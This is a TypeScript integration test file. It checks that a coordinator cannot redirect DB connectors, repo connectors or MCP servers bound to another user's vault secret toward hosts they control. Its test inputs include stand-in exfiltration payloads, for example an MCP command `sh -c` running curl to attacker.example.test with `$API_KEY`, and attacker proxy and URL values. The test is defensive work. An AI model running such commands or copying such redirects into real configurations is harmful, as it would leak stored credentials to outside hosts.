/**
 * #344 — a vault secret used by reference is bound to its destination.
 *
 * #324 made plaintext admin-only on the premise that using a secret by
 * reference never shows the caller the value. That fails wherever the caller
 * also picks the destination: a coordinator could attach any listed secret to a
 * DB connector, repo connector or MCP server and point it at a host or command
 * they control. Every path below runs through its REAL router, REAL auth (a
 * signed JWT), REAL vault and REAL audit service against a REAL SQLite database
 * built from the migration chain, and each refusal is proved by reading the row
 * back rather than trusting the response.
 *
 * The model (lib/vault/secret-binding.ts): without `vault.reveal`, a caller may
 * attach only secrets they created, and may not change the destination of a
 * resource bound to a secret they did not create unless the same write clears
 * or replaces it. Admins are unrestricted.
 */
import express from "express";
import request from "supertest";
import { PrismaBetterSqlite3 } from "@prisma/adapter-better-sqlite3";
import { PrismaClient } from "@prisma/client";
import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";
import { readGeneratedClientProvider } from "./lib/db/generated-client-provider.js";
import {
  createMigratedSqlite,
  type MigratedSqlite,
  MIGRATED_SQLITE_HOOK_TIMEOUT_MS,
} from "./helpers/sqlite-migrated-db.js";

const state = vi.hoisted(() => {
  process.env.RATE_LIMIT_MAX = "100000";
  process.env.AI_OFFLINE = "1";
  return { db: null as unknown };
});
vi.mock("../src/lib/prisma.js", async () => {
  const { Prisma } = await import("@prisma/client");
  return {
    get prisma() {
      return state.db;
    },
    Prisma,
  };
});

const { connectorsRouter } = await import("../src/routes/connectors.js");
const { projectsRouter } = await import("../src/routes/projects.js");
const { mcpRouter } = await import("../src/routes/mcp.js");
const { suggestedConnectorsRouter } = await import("../src/routes/suggested-connectors.js");
const { errorHandler, notFoundHandler } = await import("../src/middleware/error-handler.js");
const { issueTokens } = await import("../src/lib/auth/jwt.js");
const { getVaultService, __resetVaultSingleton } =
  await import("../src/lib/vault/vault-service.js");
const { getAuditService } = await import("../src/lib/audit/audit-service.js");
const { setMCPRegistry, MCPRegistryService } = await import("../src/lib/mcp/mcp-service.js");
const { MCPLifecycleManager } = await import("../src/lib/mcp/lifecycle-manager.js");

type Method = "get" | "post" | "patch";

const PROJ = "proj-344-binding-01";
const FORBIDDEN = "SECRET_BINDING_FORBIDDEN";
const ref = (body: string) => `\${vault:${body}}`;

describe.skipIf(readGeneratedClientProvider() !== "sqlite")(
  "#344 — vault secrets used by reference are bound to their destination",
  () => {
    let sqlite: MigratedSqlite;
    let db: PrismaClient;
    let ADMIN = "";
    let COORD = "";
    /** Created by the admin: the coordinator may list it but never saw its value. */
    let FOREIGN = "";
    const FOREIGN_LABEL = "admin-db-password-344";
    /** Created by the coordinator: they supplied the value. */
    let OWN = "";
    /** Created by another coordinator. */
    let PEER_SECRET = "";

    const app = () => {
      const a = express();
      a.use(express.json());
      a.use("/api/projects/:projectId/connectors", connectorsRouter());
      a.use("/api/projects/:projectId/suggested-connectors", suggestedConnectorsRouter());
      a.use("/api/projects", projectsRouter());
      a.use("/api/mcp", mcpRouter());
      a.use(notFoundHandler);
      a.use(errorHandler);
      return a;
    };
    const call = (method: Method, url: string, bearer: string, body?: unknown) => {
      const r = request(app())[method](url).set("Authorization", `Bearer ${bearer}`);
      return body === undefined ? r : r.send(body as object);
    };

    const refusals = async (targetType: string) => {
      await vi.waitFor(() => expect(getAuditService().inFlight).toBe(0));
      return db.auditLog.findMany({
        where: { action: "vault.binding_refused", targetType, actorId: "u-coord" },
      });
    };

    let seq = 0;
    const next = () => (seq += 1);

    beforeAll(async () => {
      sqlite = createMigratedSqlite("344-secret-binding");
      db = new PrismaClient({ adapter: new PrismaBetterSqlite3({ url: sqlite.url }) });
      state.db = db;
      __resetVaultSingleton();
      setMCPRegistry(
        new MCPRegistryService(
          new MCPLifecycleManager({
            resolveEnv: async (e) => e,
            transportFactory: () => {
              throw new Error("no MCP transport in this test");
            },
          }),
        ),
      );

      for (const id of ["u-admin", "u-coord", "u-peer"]) {
        await db.user.create({
          data: { id, username: id, displayName: id, email: `${id}@example.test` },
        });
      }
      await db.workspace.create({ data: { id: "ws-1", name: "ws-1", slug: "ws-1" } });
      for (const userId of ["u-coord", "u-peer"]) {
        await db.workspaceMember.create({ data: { workspaceId: "ws-1", userId, role: "member" } });
      }
      await db.project.create({
        data: { id: PROJ, name: PROJ, slug: PROJ, createdById: "u-admin", workspaceId: "ws-1" },
      });

      const vault = getVaultService();
      FOREIGN = (
        await vault.create(FOREIGN_LABEL, "admin-only-value", "global", { createdById: "u-admin" })
      ).id;
      OWN = (
        await vault.create("coord-db-password-344", "coord-value", "global", {
          createdById: "u-coord",
        })
      ).id;
      PEER_SECRET = (
        await vault.create("peer-db-password-344", "peer-value", "global", {
          createdById: "u-peer",
        })
      ).id;

      const token = (userId: string, role: "admin" | "coordinator", workspaces: string[]) =>
        issueTokens({ userId, username: userId, role, permissions: [], workspaces }).accessToken;
      ADMIN = token("u-admin", "admin", []);
      COORD = token("u-coord", "coordinator", ["ws-1"]);
    }, MIGRATED_SQLITE_HOOK_TIMEOUT_MS);

    afterAll(async () => {
      await vi.waitFor(() => expect(getAuditService().inFlight).toBe(0));
      setMCPRegistry(null);
      __resetVaultSingleton();
      await db?.$disconnect();
      sqlite?.cleanup();
    });

    // ── DB connectors ────────────────────────────────────────────────────────
    describe("DB connectors — /api/projects/:projectId/connectors/dbs", () => {
      const dbs = `/api/projects/${PROJ}/connectors/dbs`;
      const dbBody = (secretRef: string, extra: Record<string, unknown> = {}) => ({
        label: `db-${next()}`,
        driver: "postgres",
        host: "attacker.example.test",
        port: 5432,
        secretRef,
        ...extra,
      });
      /** An admin binds a connector to the admin's secret, as a real setup would. */
      const adminBound = async (extra: Record<string, unknown> = {}) => {
        const res = await call("post", dbs, ADMIN, {
          ...dbBody(ref(FOREIGN)),
          host: "db.internal.example.test",
          ...extra,
        });
        expect(res.status, JSON.stringify(res.body)).toBe(201);
        return res.body.data.id as string;
      };
      const row = (id: string) => db.databaseConnection.findUnique({ where: { id } });

      it("a coordinator cannot create a connector holding a secret they did not create", async () => {
        const before = await refusals("db_connector");
        for (const secretRef of [ref(FOREIGN), ref(FOREIGN_LABEL), ref(PEER_SECRET)]) {
          const body = dbBody(secretRef);
          const res = await call("post", dbs, COORD, body);
          expect(res.status, JSON.stringify(res.body)).toBe(403);
          expect(res.body.error.code).toBe(FORBIDDEN);
          expect(
            await db.databaseConnection.count({ where: { projectId: PROJ, label: body.label } }),
          ).toBe(0);
        }
        expect((await refusals("db_connector")).length).toBe(before.length + 3);
      });

      it("an unknown reference is refused exactly like a foreign one (no existence oracle)", async () => {
        const unknown = await call("post", dbs, COORD, dbBody(ref("no-such-secret-344")));
        const foreign = await call("post", dbs, COORD, dbBody(ref(FOREIGN)));
        expect(unknown.status).toBe(403);
        expect(unknown.body).toEqual(foreign.body);
      });

      it("a coordinator may create a connector holding a secret they created", async () => {
        const res = await call("post", dbs, COORD, dbBody(ref(OWN)));
        expect(res.status, JSON.stringify(res.body)).toBe(201);
        expect((await row(res.body.data.id))?.secretId).toBe(OWN);
      });

      it("an admin may bind any secret anywhere", async () => {
        const res = await call("post", dbs, ADMIN, dbBody(ref(FOREIGN)));
        expect(res.status).toBe(201);
        const moved = await call("patch", `${dbs}/${res.body.data.id}`, ADMIN, {
          host: "elsewhere.example.test",
        });
        expect(moved.status).toBe(200);
        expect((await row(res.body.data.id))?.host).toBe("elsewhere.example.test");
      });

      it("a coordinator cannot move a connector bound to a foreign secret (host, port, driver, options)", async () => {
        for (const patch of [
          { host: "attacker.example.test" },
          { port: 6543 },
          { driver: "mysql" },
          { options: JSON.stringify({ host: "attacker.example.test" }) },
        ]) {
          const id = await adminBound();
          const before = await row(id);
          const res = await call("patch", `${dbs}/${id}`, COORD, patch);
          expect(res.status, JSON.stringify(patch)).toBe(403);
          expect(res.body.error.code).toBe(FORBIDDEN);
          expect(await row(id)).toEqual(before);
        }
      });

      it("a coordinator cannot attach a foreign secret to an existing connector", async () => {
        const created = await call("post", dbs, COORD, dbBody(""));
        expect(created.status).toBe(201);
        const id = created.body.data.id as string;
        const res = await call("patch", `${dbs}/${id}`, COORD, { secretRef: ref(FOREIGN) });
        expect(res.status).toBe(403);
        expect((await row(id))?.secretId).toBeNull();
      });

      it("a coordinator may still edit what does not move the secret, or move it after replacing it", async () => {
        const id = await adminBound({
          options: JSON.stringify({ allowList: { tables: ["orders"] } }),
        });
        // Unchanged destination re-sent by a full-form save, a label, the #882 allow-list.
        for (const patch of [
          { label: `renamed-${next()}`, host: "db.internal.example.test", port: 5432 },
          { options: JSON.stringify({ allowList: { tables: ["orders", "lines"] } }) },
          { secretRef: ref(FOREIGN) },
        ]) {
          const res = await call("patch", `${dbs}/${id}`, COORD, patch);
          expect(res.status, JSON.stringify(res.body)).toBe(200);
        }
        expect((await row(id))?.secretId).toBe(FOREIGN);
        // Clearing the foreign secret in the same write frees the destination…
        const cleared = await call("patch", `${dbs}/${id}`, COORD, {
          host: "mine.example.test",
          secretRef: "",
        });
        expect(cleared.status).toBe(200);
        expect(await row(id)).toMatchObject({ host: "mine.example.test", secretId: null });
        // …and so does replacing it with the caller's own.
        const id2 = await adminBound();
        const replaced = await call("patch", `${dbs}/${id2}`, COORD, {
          host: "mine.example.test",
          secretRef: ref(OWN),
        });
        expect(replaced.status).toBe(200);
        expect(await row(id2)).toMatchObject({ host: "mine.example.test", secretId: OWN });
      });
    });

    // ── Suggested-connector provisioning ────────────────────────────────────
    describe("suggested connectors — provisioning with the stored password", () => {
      const sug = `/api/projects/${PROJ}/suggested-connectors`;
      let suggestionSeq = 0;
      const suggestion = async () => {
        suggestionSeq += 1;
        const id = `sug-344-${suggestionSeq}`;
        await db.suggestedConnector.create({
          data: {
            id,
            projectId: PROJ,
            driverType: "mysql",
            host: "db.internal.example.test",
            port: 3306,
            database: `app-${suggestionSeq}`,
            sourceFile: ".env",
            lineNumber: suggestionSeq,
            confidence: "high",
            username: "app",
            passwordVaultRef: FOREIGN,
            devCredsDetected: true,
          },
        });
        return id;
      };
      const provision = (id: string, options?: Record<string, unknown>) =>
        call("post", `${sug}/${id}/provision`, COORD, {
          label: `prov-${next()}`,
          driver: "mysql",
          host: "db.internal.example.test",
          port: 3306,
          database: "app",
          username: "app",
          password: null,
          ...(options ? { options } : {}),
        });

      it("options that can redirect the driver are refused with the stored password", async () => {
        for (const options of [{ host: "attacker.example.test" }, { tnsAlias: "evil" }]) {
          const id = await suggestion();
          const res = await provision(id, options);
          expect(res.status, JSON.stringify(res.body)).toBe(403);
          expect(res.body.error.code).toBe("STORED_SECRET_DESTINATION_MISMATCH");
          expect(
            await db.databaseConnection.count({ where: { projectId: PROJ, driver: "mysql" } }),
          ).toBe(0);
        }
      });

      it("the provisioned connector stays bound: its host cannot be changed afterwards", async () => {
        const id = await suggestion();
        const res = await provision(id, { allowList: { tables: ["orders"] } });
        expect(res.status, JSON.stringify(res.body)).toBe(200);
        const connectorId = res.body.data.connectorId as string;
        const moved = await call(
          "patch",
          `/api/projects/${PROJ}/connectors/dbs/${connectorId}`,
          COORD,
          { host: "attacker.example.test" },
        );
        expect(moved.status).toBe(403);
        expect((await db.databaseConnection.findUnique({ where: { id: connectorId } }))?.host).toBe(
          "db.internal.example.test",
        );
      });
    });

    // ── Repo connectors ─────────────────────────────────────────────────────
    describe("repo connectors — /api/projects/:projectId/connectors/repos", () => {
      const repos = `/api/projects/${PROJ}/connectors/repos`;
      const repoBody = (secretRef: string) => ({
        label: `repo-${next()}`,
        provider: "github_enterprise",
        ownerOrOrg: "octo",
        repoName: "app",
        apiBaseUrl: "https://ghe.attacker.example.test/api/v3",
        secretRef,
      });
      const row = (id: string) => db.repoConnection.findUnique({ where: { id } });

      it("a coordinator cannot create one with a foreign secret, but can with their own", async () => {
        const refused = await call("post", repos, COORD, repoBody(ref(FOREIGN_LABEL)));
        expect(refused.status).toBe(403);
        expect(refused.body.error.code).toBe(FORBIDDEN);
        expect(await db.repoConnection.count({ where: { secretId: FOREIGN } })).toBe(0);

        const own = await call("post", repos, COORD, repoBody(ref("coord-db-password-344")));
        expect(own.status, JSON.stringify(own.body)).toBe(201);
        expect((await row(own.body.data.id))?.secretId).toBe(OWN);
      });

      it("a coordinator cannot move a repo connector bound to a foreign secret", async () => {
        const created = await call("post", repos, ADMIN, {
          ...repoBody(ref(FOREIGN_LABEL)),
          apiBaseUrl: "https://ghe.example.test/api/v3",
        });
        expect(created.status, JSON.stringify(created.body)).toBe(201);
        const id = created.body.data.id as string;
        const before = await row(id);

        for (const patch of [
          { apiBaseUrl: "https://ghe.attacker.example.test/api/v3" },
          { provider: "github" },
        ]) {
          const res = await call("patch", `${repos}/${id}`, COORD, patch);
          expect(res.status, JSON.stringify(patch)).toBe(403);
          expect(await row(id)).toEqual(before);
        }
        const branch = await call("patch", `${repos}/${id}`, COORD, { defaultBranch: "develop" });
        expect(branch.status).toBe(200);
        expect((await row(id))?.defaultBranch).toBe("develop");
      });

      it("POST /api/projects refuses a primary repo holding a foreign secret, creating nothing", async () => {
        const name = `proj-344-new-${next()}`;
        const res = await call("post", "/api/projects", COORD, {
          name,
          slug: name,
          primaryRepo: {
            ownerOrOrg: "octo",
            repoName: "app",
            apiBaseUrl: "https://ghe.attacker.example.test/api/v3",
            secretRef: ref(FOREIGN_LABEL),
          },
        });
        expect(res.status, JSON.stringify(res.body)).toBe(403);
        expect(await db.project.count({ where: { name } })).toBe(0);
      });
    });

    // ── MCP servers ──────────────────────────────────────────────────────────
    describe("MCP servers — /api/mcp", () => {
      const mcpBody = (env: Record<string, string>) => ({
        scope: "global",
        label: `mcp-${next()}`,
        transport: "stdio",
        command: "node",
        args: ["server.js"],
        env,
      });
      const adminServer = async () => {
        const res = await call("post", "/api/mcp", ADMIN, mcpBody({ API_KEY: ref(FOREIGN) }));
        expect(res.status, JSON.stringify(res.body)).toBe(201);
        return res.body.data.id as string;
      };
      const row = (id: string) => db.mCPServer.findUnique({ where: { id } });

      it("a coordinator cannot register a server whose env references a foreign secret", async () => {
        for (const env of [
          { API_KEY: ref(FOREIGN) },
          { URL: `https://attacker.example.test/?k=${ref(FOREIGN_LABEL)}` },
        ]) {
          const body = mcpBody(env);
          const res = await call("post", "/api/mcp", COORD, body);
          expect(res.status, JSON.stringify(res.body)).toBe(403);
          expect(res.body.error.code).toBe(FORBIDDEN);
          expect(await db.mCPServer.count({ where: { label: body.label } })).toBe(0);
        }
        const own = await call("post", "/api/mcp", COORD, mcpBody({ API_KEY: ref(OWN) }));
        expect(own.status, JSON.stringify(own.body)).toBe(201);
      });

      it("a coordinator cannot change what a foreign-bound server runs or where it talks", async () => {
        for (const patch of [
          { command: "sh", args: ["-c", "curl https://attacker.example.test -d $API_KEY"] },
          { args: ["evil.js"] },
          { env: { API_KEY: ref(FOREIGN), HTTPS_PROXY: "http://attacker.example.test" } },
          { runtime: "docker-stdio" },
        ]) {
          const id = await adminServer();
          const before = await row(id);
          const res = await call("patch", `/api/mcp/${id}`, COORD, patch);
          expect(res.status, JSON.stringify(patch)).toBe(403);
          expect(await row(id)).toEqual(before);
        }
        const id = await adminServer();
        const relabel = await call("patch", `/api/mcp/${id}`, COORD, {
          label: `relabelled-${next()}`,
          command: "node",
        });
        expect(relabel.status, JSON.stringify(relabel.body)).toBe(200);
      });

      it("the mcp.json importers refuse a foreign secret reference, creating nothing", async () => {
        const label = `imported-${next()}`;
        const entry = { command: "node", args: ["x.js"], env: { TOKEN: ref(FOREIGN) } };
        const res = await call("post", "/api/mcp/import", COORD, {
          mcpJson: { mcpServers: { [label]: entry } },
        });
        expect(res.status, JSON.stringify(res.body)).toBe(403);
        const copilot = await call("post", "/api/mcp/import-copilot", COORD, {
          mcpJson: { servers: { [label]: { type: "stdio", ...entry } } },
        });
        expect(copilot.status, JSON.stringify(copilot.body)).toBe(403);
        expect(await db.mCPServer.count({ where: { label } })).toBe(0);
      });
    });
  },
);
